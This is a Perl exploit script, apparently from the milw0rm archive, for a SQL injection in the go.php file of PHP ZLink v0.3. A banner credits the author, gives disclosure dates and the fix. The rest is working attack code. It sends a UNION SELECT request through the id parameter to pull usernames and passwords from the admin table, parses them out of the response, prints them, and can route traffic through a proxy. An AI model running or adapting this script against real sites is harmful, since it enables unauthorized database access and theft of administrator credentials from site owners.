#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;

if(!$ARGV[3])
{
  print "\n                         \\#'#/                    ";
  print "\n                         (-.-)                     ";
  print "\n   -----------------oOO---(_)---OOo----------------";
  print "\n   | PHP ZLink v0.3 (go.php) Remote SQL Injection |";
  print "\n   |                 coded by DNX                 |";
  print "\n   ------------------------------------------------";
  print "\n[!] Discovered.: DNX";
  print "\n[!] Vendor.....: http://www.zeak.net";
  print "\n[!] Detected...: 28.10.2007";
  print "\n[!] Reported...: 28.10.2007";
  print "\n[!] Response...: 29.10.2007";
  print "\n";
  print "\n[!] Background.: PHP ZLink is a free short Url Redirection Script";
  print "\n";
  print "\n[!] Bug........: \$id in go.php";
  print "\n";
  print "\n                 line 25: \$id = \$_GET['id']";
  print "\n";
  print "\n                 line 28: SELECT url FROM \$table WHERE id = \$id";
  print "\n";
  print "\n[!] Solution...: Upgrade to PHP ZLink v1.0";
  print "\n";
  print "\n[!] Usage......: perl zlink.pl [Host] [Path] <Options>";
  print "\n[!] Example....: perl zlink.pl 127.0.0.1 /zlink/ -id 1";
  print "\n[!] Options....:";
  print "\n       -id [no]      Valid ID";
  print "\n       -p [ip:port]  Proxy support";
  print "\n";
  exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $table   = "admin";
my $id      = 0;
my %options = ();
GetOptions(\%options, "id=i", "p=s");

print "[!] Exploiting...\n";

if($options{"id"})
{
  exploit($options{"id"});
}
else
{
  print "[!] Exploit failed, missing parameter\n";
  exit;
}

print "\n[!] Exploit done\n";

sub exploit
{
  my $id     = shift;
  my $url    = "http://".$host.$path."go.php?id=".$id."%20union%20select%20concat(username,0x2f,password)%20from%20admin";
  my $regexp = "<iframe(.*)src=\"(.*)\"><\/iframe>";
  
  my $ua = LWP::UserAgent->new;
  
  if($options{"p"})
  {
    $ua->proxy('http', "http://".$options{"p"});
  }
  
  my $response = $ua->get($url);
  my $content = $response->content;
  @content = split(/\n/, $content);
  $found = 0;
  
  foreach (@content)
  {
    if($_ =~ /$regexp/ && $2 !~ /http/)
    {
      ($user, $pass) = split(/\//, $2);
      print "User/Password: ".$user."/".$pass."\n";
      $found = 1;
    }
  }
  
  if(!$found)
  {
    $count = 2;
    $noendless = 20;
    while($count < $noendless)
    {
      $response = $ua->get($url."%20limit%20".$count++);
      if($tmp eq $response->base)
      {
        $count = $noendless;
      }
      else
      {        
        $tmp = $response->base;
        ($x, $y) = split(/$host$path/, $tmp);
        print "User/Password: ".$y."\n";
      }
    }
  }
}

# milw0rm.com [2007-12-23]
